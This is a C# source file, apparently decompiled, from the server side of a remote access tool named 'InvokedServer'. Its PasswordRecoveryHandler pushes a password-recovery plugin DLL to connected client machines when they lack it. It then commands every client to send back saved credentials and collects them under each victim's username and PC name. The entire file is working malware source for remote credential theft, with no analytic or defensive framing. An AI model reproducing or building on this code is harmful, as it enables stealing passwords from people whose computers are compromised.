

using InvokedCommon.Messages;
using InvokedCommon.Models;
using InvokedCommon.Networking;
using InvokedServer.Enums;
using InvokedServer.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;


namespace InvokedServer.Messages
{
	public class PasswordRecoveryHandler : MessageProcessorBase<object>
	{
		private string _pluginPath = "Plugins\\PluginPasswordRecovery.dll";
		private string _pluginName = "PasswordRecovery";
		private readonly InvokedServer.Networking.Client[] _clients;

		public event PasswordRecoveryHandler.PluginStatusEventHandler PluginStatusChanged;

		private void OnPluginStatusChanged(PluginStatus value)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(val =>
			{
				PasswordRecoveryHandler.PluginStatusEventHandler pluginStatusChanged = this.PluginStatusChanged;
				if (pluginStatusChanged == null)
					return;
				pluginStatusChanged((object)this, (PluginStatus)val);
			}), (object)value);
		}

		public event PasswordRecoveryHandler.AccountsRecoveredEventHandler AccountsRecovered;

		private void OnAccountsRecovered(List<RecoveredAccount> accounts, string clientIdentifier)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(d =>
			{
				PasswordRecoveryHandler.AccountsRecoveredEventHandler accountsRecovered = this.AccountsRecovered;
				if (accountsRecovered == null)
					return;
				accountsRecovered((object)this, clientIdentifier, (List<RecoveredAccount>)d);
			}), (object)accounts);
		}

		public PasswordRecoveryHandler(InvokedServer.Networking.Client[] clients)
		  : base(true)
		{
			this._clients = clients;
		}

		public override bool CanExecute(IMessage message)
		{
			return message is GetPasswordsResponse || message is CheckPluginResponse;
		}

		public override bool CanExecuteFrom(ISender sender)
		{
			return ((IEnumerable<InvokedServer.Networking.Client>)this._clients).Any<InvokedServer.Networking.Client>((Func<InvokedServer.Networking.Client, bool>)(c => c.Equals((object)sender)));
		}

		public override void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case GetPasswordsResponse message1:
					this.Execute(sender, message1);
					break;
				case CheckPluginResponse message2:
					this.Execute(sender, message2);
					break;
			}
		}

		public void CheckPluginStatus()
		{
			foreach (InvokedServer.Networking.Client client in ((IEnumerable<InvokedServer.Networking.Client>)this._clients).Where<InvokedServer.Networking.Client>((Func<InvokedServer.Networking.Client, bool>)(client => client != (InvokedServer.Networking.Client)null)))
				client.Send<CheckPlugin>(new CheckPlugin()
				{
					PluginName = this._pluginName
				});
		}

		private void Execute(ISender client, CheckPluginResponse message)
		{
			if (message.PluginName != this._pluginName)
				return;
			if (message.Status)
			{
				this.OnPluginStatusChanged(PluginStatus.Loaded);
				this.BeginAccountRecovery();
			}
			else
			{
				this.OnPluginStatusChanged(PluginStatus.Installing);
				if (File.Exists(this._pluginPath))
					client.Send<DoPlugin>(new DoPlugin()
					{
						PluginName = this._pluginName,
						Data = Zip.Compress(File.ReadAllBytes(this._pluginPath))
					});
				else
					this.OnPluginStatusChanged(PluginStatus.PluginFileNotFound);
			}
		}

		public void BeginAccountRecovery()
		{
			GetPasswords message = new GetPasswords();
			foreach (InvokedServer.Networking.Client client in ((IEnumerable<InvokedServer.Networking.Client>)this._clients).Where<InvokedServer.Networking.Client>((Func<InvokedServer.Networking.Client, bool>)(client => client != (InvokedServer.Networking.Client)null)))
				client.Send<GetPasswords>(message);
		}

		private void Execute(ISender client, GetPasswordsResponse message)
		{
			InvokedServer.Networking.Client client1 = (InvokedServer.Networking.Client)client;
			string clientIdentifier = client1.Value.Username + "@" + client1.Value.PcName;
			this.OnAccountsRecovered(message.RecoveredAccounts, clientIdentifier);
		}

		public delegate void PluginStatusEventHandler(object sender, PluginStatus value);

		public delegate void AccountsRecoveredEventHandler(
		  object sender,
		  string clientIdentifier,
		  List<RecoveredAccount> accounts);
	}
}